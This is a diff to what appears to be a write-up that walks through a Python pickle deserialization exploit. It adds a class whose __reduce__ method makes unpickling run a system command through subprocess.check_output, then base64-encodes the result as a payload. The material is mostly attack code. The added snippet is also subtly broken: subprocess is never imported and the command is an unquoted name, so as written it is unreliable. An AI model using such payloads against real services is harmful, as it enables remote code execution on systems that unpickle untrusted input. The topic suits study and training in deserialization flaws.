@@ -40,10 +40,34 @@ class anti_pickle_serum(object):
 exploit_obj = anti_pickle_serum()  
 raw_pickle = pickle.dumps({"serum": exploit_obj}, protocol=0)  
   
-optimed_pickle = pickletools.optimize(raw_pickle)  
-pickletools.dis(optimed_pickle)  
+optimized_pickle = pickletools.optimize(raw_pickle)  
+pickletools.dis(optimized_pickle)  
   
 payload= base64.b64encode(raw_pickle)  
+print(payload)
+```
+
+Now add the reduce method
+```python
+import pickle  
+import pickletools  
+import base64  
+import os  
+  
+class AntiPickleSerum(object):  
+   def __init__(self):  
+       pass  
+  
+   def __reduce__(self):  
+       return subprocess.check_output, (ls,) 
+  
+exploit_obj = AntiPickleSerum()  
+raw_pickle = pickle.dumps({"serum": exploit_obj}, protocol=0)  
+  
+optimized_pickle = pickletools.optimize(raw_pickle)  
+pickletools.dis(optimized_pickle)  
+  
+payload = base64.b64encode(raw_pickle)  
 print(payload)
 ```
 
